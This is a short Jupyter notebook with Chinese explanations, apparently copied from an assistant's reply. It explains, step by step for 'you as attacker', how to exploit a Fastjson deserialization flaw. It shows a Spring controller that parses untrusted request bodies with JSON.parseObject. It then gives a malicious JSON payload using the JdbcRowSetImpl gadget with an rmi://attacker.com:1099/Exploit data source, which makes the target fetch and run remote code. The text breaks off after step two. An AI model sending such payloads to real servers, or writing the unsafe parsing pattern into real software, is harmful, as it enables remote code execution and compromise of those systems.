{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "是的，作为攻击者，你需要构造特定的 JSON 数据，并通过调用靶机上存在漏洞的接口来触发漏洞。下面是更详细的步骤：\n",
    "\n",
    "1. 确认靶机的接口\n",
    "假设你已经有一个包含 Fastjson 漏洞的应用程序，并且这个应用程序有一个可以接受 JSON 数据的接口。例如，一个 HTTP POST 接口："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "@RestController\n",
    "public class VulnerableController {\n",
    "\n",
    "    @PostMapping(\"/parse\")\n",
    "    public String parseJson(@RequestBody String jsonString) {\n",
    "        Object obj = JSON.parseObject(jsonString);\n",
    "        return \"Parsed: \" + obj.toString();\n",
    "    }\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. 构造恶意 JSON 数据\n",
    "构造一个恶意 JSON 数据包，以利用 Fastjson 的 RCE 漏洞。下面是一个示例："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{\n",
    "  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n",
    "  \"dataSourceName\": \"rmi://attacker.com:1099/Exploit\",\n",
    "  \"autoCommit\": true\n",
    "}\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
